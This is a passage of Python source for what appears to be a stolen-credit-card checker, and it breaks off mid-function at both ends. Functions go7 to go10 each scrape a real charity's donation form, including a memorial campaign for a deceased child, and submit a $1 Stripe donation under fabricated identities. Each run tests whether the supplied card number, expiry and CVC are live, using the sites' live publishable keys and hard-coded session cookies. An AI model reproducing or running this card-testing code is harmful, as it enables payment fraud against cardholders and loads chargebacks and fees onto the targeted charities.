        else:
            print("❌ Payment no need Rq4. Stopping here.")
            result2 = response.text
            return result2  #stop
            
    except Exception as e:
        print(f"Error occurred: {e}")         

#============================================
# --- Main CC Check Function ---
def go7(cc_input: str) -> str:
    try:
        n, mm, yy, cvc = cc_input.strip().split("|")

        if int(mm) < 10 and not mm.startswith("0"):
            mm = f"0{mm}"
        if not yy.startswith("20"):
            yy = f"20{yy}"

        user = generate_user_agent()
        r = requests.Session()
        r.verify = False

        first_name, last_name = generate_full_name()
        kaddress, city, country, postcode, phone = generate_address()
        email = generate_email()
        username = generate_username()
        corr = generate_random_code()
        sess = generate_random_code()

#        proxy = get_random_proxy()
#        print(f"Using proxy: {proxy['http']}")  
      
        #1
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        response = requests.get('https://journalingthroughchildloss.com/campaigns/my-daughter-holly/donate/', headers=headers)
        form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
        donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
        campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
        donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
        print(f"G7 ID Response: {form_id}")
        print(f"G7 ID Response: {donation_nonce}")
        print(f"G7 ID Response: {campaign_id}")
        print(f"G7 ID Response: {donation_id}")
        	
        #2
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        data = f'type=card&billing_details[name]=Han+Maw&billing_details[email]={email}&billing_details[address][city]=Racie&billing_details[address][country]=AU&billing_details[address][line1]=24+George+Street&billing_details[address][postal_code]=2000&billing_details[address][state]=New+South+Walet&billing_details[phone]=%2B61290123456&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F5b3d231411%3B+stripe-js-v3%2F5b3d231411%3B+card-element&referrer=https%3A%2F%2Fjournalingthroughchildloss.com&time_on_page=22269&client_attribution_metadata[client_session_id]=a8f147b9-98f4-466e-a8dc-f0026e2d0cd9&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51RYXfrG6vswUk4I75Tf67Mf9a3RuRAjVfBxNBPqTJ666AXP5QrznWn7vD9PFOCRFlI0shGQf8M8wJMM5BEnfd6Th000sLkrsHp'
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        res_json = response.json()
        pm = res_json.get('id')
        print(f"G7 ID Response: {pm}")
        if not id:
            print("Failed to get payment method.")
            return
                
        #3
        cookies = {
    '__stripe_mid': '2cbc56d6-aa31-49d7-9e31-9e96ae8ae686c188fc',
    'charitable_session': '4cabc037d0927b8780bd54e633d74d16||86400||82800',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-12-04%2006%3A24%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fjournalingthroughchildloss.com%2Fcampaigns%2Fmy-daughter-holly%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fjournalingthroughchildloss.com%2Fcampaigns%2Fmy-daughter-holly%2F',
    'sbjs_first_add': 'fd%3D2025-12-04%2006%3A24%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fjournalingthroughchildloss.com%2Fcampaigns%2Fmy-daughter-holly%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fjournalingthroughchildloss.com%2Fcampaigns%2Fmy-daughter-holly%2F',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36',
    'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fjournalingthroughchildloss.com%2Fcampaigns%2Fmy-daughter-holly%2Fdonate%2F',
    '__stripe_sid': 'dc4c9594-6716-43c5-926c-fb648899557ce6f4bb',
        }
        headers = {
    'authority': 'journalingthroughchildloss.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://journalingthroughchildloss.com',
    'pragma': 'no-cache',
    'referer': 'https://journalingthroughchildloss.com/campaigns/my-daughter-holly/donate/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
        }
        data = {
    'charitable_form_id': f'{form_id}',
    f'{form_id}': '',
    '_charitable_donation_nonce': f'{donation_nonce}',
    '_wp_http_referer': '/campaigns/my-daughter-holly/donate/',
    'campaign_id': f'{campaign_id}',
    'description': 'Support Hollys Legacy',
    'ID': f'{donation_id}',
    'gateway': 'stripe',
    'custom_donation_amount': '1.00',
    'first_name': 'Tiana',
    'last_name': 'Jakubowski',
    'email': email,
    'address': '24 George Street',
    'address_2': '',
    'city': 'Racie',
    'state': 'New South Walet',
    'postcode': '2000',
    'country': 'AU',
    'phone': '+61290123456',
    'stripe_payment_method': f'{pm}',
    'action': 'make_donation',
    'form_action': 'make_donation',
        }
        response = requests.post(
    'https://journalingthroughchildloss.com/wp-admin/admin-ajax.php',
    cookies=cookies,
    headers=headers,
    data=data,#, proxies=proxy, timeout=30)    
        )
        if "secret" in response.text:
            print("✅ req3 required. Continue with next step...")
            response_str = response.text
            response = json.loads(response_str)
            secret = response.get("secret")
            pattern = r"^(pi_[a-zA-Z0-9]+)_secret_[a-zA-Z0-9]+$"
            match = re.match(pattern, secret)
            if match:
            	full_secret = secret
            	prefix = match.group(1)
            	print("Full secret:", full_secret)
            	print("Prefix:", prefix)
            else:
            	print("No match found")
            	
            #4
            headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
            }
            data = {
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_51RYXfrG6vswUk4I75Tf67Mf9a3RuRAjVfBxNBPqTJ666AXP5QrznWn7vD9PFOCRFlI0shGQf8M8wJMM5BEnfd6Th000sLkrsHp',
    'client_secret': full_secret,
            }
            response = requests.post(
    f'https://api.stripe.com/v1/payment_intents/{prefix}/confirm',
    headers=headers,
    data=data,
            )                        
            # message
            result2 = response.text                      	
            return result2 #stop
            	
        else:
            print("❌ Payment no need Rq4. Stopping here.")
            result2 = response.text
            return result2  #stop
            
    except Exception as e:
        print(f"Error occurred: {e}") 
        
#============================================
# --- Main CC Check Function ---
def go8(cc_input: str) -> str:
    try:
        n, mm, yy, cvc = cc_input.strip().split("|")

        if int(mm) < 10 and not mm.startswith("0"):
            mm = f"0{mm}"
        if not yy.startswith("20"):
            yy = f"20{yy}"

        user = generate_user_agent()
        r = requests.Session()
        r.verify = False

        first_name, last_name = generate_full_name()
        kaddress, city, country, postcode, phone = generate_address()
        email = generate_email()
        username = generate_username()
        corr = generate_random_code()
        sess = generate_random_code()

#        proxy = get_random_proxy()
#        print(f"Using proxy: {proxy['http']}")  
      
        #1
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        response = requests.get('https://keepnaturealive.de/campaigns/crfev/donate/', headers=headers)
        form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
        donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
        campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
        donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
        print(f"G8 ID Response: {form_id}")
        print(f"G8 ID Response: {donation_nonce}")
        print(f"G8 ID Response: {campaign_id}")
        print(f"G8 ID Response: {donation_id}")
        	
        #2
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        data = f'type=card&billing_details[name]=Han+Maw&billing_details[email]={email}&billing_details[address][city]=Racie&billing_details[address][country]=DE&billing_details[address][line1]=24+George+Street&billing_details[address][postal_code]=2000&billing_details[address][state]=New+South+Walet&billing_details[phone]=%2B61290123456&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F014aea9fff%3B+stripe-js-v3%2F014aea9fff%3B+card-element&referrer=https%3A%2F%2Fkeepnaturealive.de&time_on_page=29218&client_attribution_metadata[client_session_id]=27535783-ac9b-414d-ac91-b11d2d687921&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51IadOaEenfgvdQ2uXrRsYOOGtj97lmwqWGAGCtiInGBKVfoSRTZ4na9IT93C1Bje98an0IJIOIsOzhAbqZbqH3ue00ZrQ8wltR'
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        res_json = response.json()
        pm = res_json.get('id')
        print(f"G8 ID Response: {pm}")
        if not id:
            print("Failed to get payment method.")
            return
                
        #3
        cookies = {
    'cookie_notice_accepted': 'true',
    '__stripe_mid': '6ca63d23-a05c-45a6-b8f5-683785a56fff9ef17d',
    'charitable_session': 'b0799009a13b3099d23ad78213755960||86400||82800',
    '__stripe_sid': '7654bc4b-85b4-415f-8de2-8b7850ffeb01e54711',
        }
        headers = {
    'authority': 'keepnaturealive.de',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://keepnaturealive.de',
    'pragma': 'no-cache',
    'referer': 'https://keepnaturealive.de/campaigns/crfev/donate/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
        }
        data = f'charitable_form_id={form_id}&{form_id}=&_charitable_donation_nonce={donation_nonce}&_wp_http_referer=%2Fcampaigns%2Fcrfev%2Fdonate%2F&campaign_id={campaign_id}&description=Conservation+and+Research+Fund+e.V.+(CRF)&ID={donation_id}&donation_amount=custom&custom_donation_amount=1&first_name=Tiana&last_name=Jakubowski&email={email}&address=24+George+Street&address_2=&city=Racie&state=New+South+Walet&postcode=2000&country=DE&phone=%2B61290123456&gateway=stripe&stripe_payment_method={pm}&action=make_donation&form_action=make_donation'
        response = requests.post(
    'https://keepnaturealive.de/wp-admin/admin-ajax.php',
    cookies=cookies,
    headers=headers,
    data=data,#, proxies=proxy, timeout=30)    
        )
        if "secret" in response.text:
            print("✅ req3 required. Continue with next step...")
            response_str = response.text
            response = json.loads(response_str)
            secret = response.get("secret")
            pattern = r"^(pi_[a-zA-Z0-9]+)_secret_[a-zA-Z0-9]+$"
            match = re.match(pattern, secret)
            if match:
            	full_secret = secret
            	prefix = match.group(1)
            	print("Full secret:", full_secret)
            	print("Prefix:", prefix)
            else:
            	print("No match found")
            	
            #4
            headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
            }
            data = {
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_51IadOaEenfgvdQ2uXrRsYOOGtj97lmwqWGAGCtiInGBKVfoSRTZ4na9IT93C1Bje98an0IJIOIsOzhAbqZbqH3ue00ZrQ8wltR',
    'client_secret': full_secret,
            }
            response = requests.post(
    f'https://api.stripe.com/v1/payment_intents/{prefix}/confirm',
    headers=headers,
    data=data,
            )                        
            # message
            result2 = response.text                      	
            return result2 #stop
            	
        else:
            print("❌ Payment no need Rq4. Stopping here.")
            result2 = response.text
            return result2  #stop
            
    except Exception as e:
        print(f"Error occurred: {e}") 
        
        
#============================================
# --- Main CC Check Function ---
def go9(cc_input: str) -> str:
    try:
        n, mm, yy, cvc = cc_input.strip().split("|")

        if int(mm) < 10 and not mm.startswith("0"):
            mm = f"0{mm}"
        if not yy.startswith("20"):
            yy = f"20{yy}"

        user = generate_user_agent()
        r = requests.Session()
        r.verify = False

        first_name, last_name = generate_full_name()
        kaddress, city, country, postcode, phone = generate_address()
        email = generate_email()
        username = generate_username()
        corr = generate_random_code()
        sess = generate_random_code()

#        proxy = get_random_proxy()
#        print(f"Using proxy: {proxy['http']}")  
      
        #1
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        response = requests.get('https://hdsportsfoundation.org/campaigns/donate/', headers=headers)
        form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
        donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
        campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
        donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
        print(f"G9 ID Response: {form_id}")
        print(f"G9 ID Response: {donation_nonce}")
        print(f"G9 ID Response: {campaign_id}")
        print(f"G9 ID Response: {donation_id}")
        	
        #2
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        data = f'type=card&billing_details[name]=Han+Maw&billing_details[email]={email}&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F014aea9fff%3B+stripe-js-v3%2F014aea9fff%3B+card-element&referrer=https%3A%2F%2Fhdsportsfoundation.org&time_on_page=17915&client_attribution_metadata[client_session_id]=753c8b7f-a5b9-4144-a52a-3bebac4034a1&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51NPpJdKIUe0GoHOrOLxrVcrMF6MA6k1XBhV1ZP1iTuHaF5oyatiiRzfipcqikkiJdPUcXpUVCvSlzvzOHDRdWHGX00JclvNuFr'
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        res_json = response.json()
        pm = res_json.get('id')
        print(f"G9 ID Response: {pm}")
        if not id:
            print("Failed to get payment method.")
            return
                
        #3
        cookies = {
    '__stripe_mid': 'ed0951a7-c30f-4283-ae51-93acb8fc00be343415',
    'charitable_session': '8950375b71d31a100fb6f172e73c4f75||86400||82800',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-12-18%2006%3A17%3A03%7C%7C%7Cep%3Dhttps%3A%2F%2Fhdsportsfoundation.org%2Fcampaigns%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhdsportsfoundation.org%2Fcampaigns%2Fdonate%2F',
    'sbjs_first_add': 'fd%3D2025-12-18%2006%3A17%3A03%7C%7C%7Cep%3Dhttps%3A%2F%2Fhdsportsfoundation.org%2Fcampaigns%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhdsportsfoundation.org%2Fcampaigns%2Fdonate%2F',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36',
    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhdsportsfoundation.org%2Fcampaigns%2Fdonate%2F',
    '__stripe_sid': '6a4680c0-004f-4f44-abab-c3a422a73a528a2e36',
        }
        headers = {
    'authority': 'hdsportsfoundation.org',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://hdsportsfoundation.org',
    'pragma': 'no-cache',
    'referer': 'https://hdsportsfoundation.org/campaigns/donate/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
        }
        data = {
    'charitable_form_id': f'{form_id}',
    f'{form_id}': '',
    '_charitable_donation_nonce': f'{donation_nonce}',
    '_wp_http_referer': '/campaigns/donate/',
    'campaign_id': f'{campaign_id}',
    'description': 'Donate',
    'ID': f'{donation_id}',
    'gateway': 'stripe',
    'donation_amount': 'custom',
    'custom_donation_amount': '1.00',
    'first_name': 'Tiana',
    'last_name': 'Jakubowski',
    'email': email,
    'stripe_payment_method': f'{pm}',
    'action': 'make_donation',
    'form_action': 'make_donation',
        }
        response = requests.post(
    'https://hdsportsfoundation.org/wp-admin/admin-ajax.php',
    cookies=cookies,
    headers=headers,
    data=data,#, proxies=proxy, timeout=30)    
        )
        if "secret" in response.text:
            print("✅ req3 required. Continue with next step...")
            response_str = response.text
            response = json.loads(response_str)
            secret = response.get("secret")
            pattern = r"^(pi_[a-zA-Z0-9]+)_secret_[a-zA-Z0-9]+$"
            match = re.match(pattern, secret)
            if match:
            	full_secret = secret
            	prefix = match.group(1)
            	print("Full secret:", full_secret)
            	print("Prefix:", prefix)
            else:
            	print("No match found")
            	
            #4
            headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
            }
            data = {
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_51NPpJdKIUe0GoHOrOLxrVcrMF6MA6k1XBhV1ZP1iTuHaF5oyatiiRzfipcqikkiJdPUcXpUVCvSlzvzOHDRdWHGX00JclvNuFr',
    'client_secret': full_secret,
            }
            response = requests.post(
    f'https://api.stripe.com/v1/payment_intents/{prefix}/confirm',
    headers=headers,
    data=data,
            )                        
            # message
            result2 = response.text                      	
            return result2 #stop
            	
        else:
            print("❌ Payment no need Rq4. Stopping here.")
            result2 = response.text
            return result2  #stop
            
    except Exception as e:
        print(f"Error occurred: {e}") 
        
#============================================
# --- Main CC Check Function ---
def go10(cc_input: str) -> str:
    try:
        n, mm, yy, cvc = cc_input.strip().split("|")

        if int(mm) < 10 and not mm.startswith("0"):
            mm = f"0{mm}"
        if not yy.startswith("20"):
            yy = f"20{yy}"

        user = generate_user_agent()
        r = requests.Session()
        r.verify = False

        first_name, last_name = generate_full_name()
        kaddress, city, country, postcode, phone = generate_address()
        email = generate_email()
        username = generate_username()
        corr = generate_random_code()
        sess = generate_random_code()

#        proxy = get_random_proxy()
#        print(f"Using proxy: {proxy['http']}")  
      
        #1
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        response = requests.get('https://apeacewithin.org/donation-page/', headers=headers)
        form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
        donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
        campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
        donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
        print(f"G10 ID Response: {form_id}")
        print(f"G10 ID Response: {donation_nonce}")
        print(f"G10 ID Response: {campaign_id}")
        print(f"G10 ID Response: {donation_id}")
        	
        #2
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        data = f'type=card&billing_details[name]=Han+Maw&billing_details[email]={email}&billing_details[address][city]=Racie&billing_details[address][country]=AU&billing_details[address][line1]=24+George+Street&billing_details[address][postal_code]=2000&billing_details[address][state]=New+South+Walet&billing_details[phone]=%2B61290123456&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fbe0b733d77%3B+stripe-js-v3%2Fbe0b733d77%3B+card-element&referrer=https%3A%2F%2Fapeacewithin.org&time_on_page=18663&client_attribution_metadata[client_session_id]=67d742f1-308b-4ff3-b021-41e7b7eedb56&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51SLtAyCCN2Lu09IK5wAiYqjCXgQOozIV5lqweW3r1Bs5ucosj0kuXTJ7nC5S2Xc5CT4xYuObLLxCnXJsWHCAQPLk00cGAmbonk'
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        res_json = response.json()
        pm = res_json.get('id')
        print(f"G10 ID Response: {pm}")
        if not id:
            print("Failed to get payment method.")
            return
                
        #3
        cookies = {
    'charitable_session': '4a420c50ecead7a11aee42561fb52b2c||86400||82800',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-12-13%2019%3A33%3A26%7C%7C%7Cep%3Dhttps%3A%2F%2Fapeacewithin.org%2Fdonation-page%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-12-13%2019%3A33%3A26%7C%7C%7Cep%3Dhttps%3A%2F%2Fapeacewithin.org%2Fdonation-page%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36',
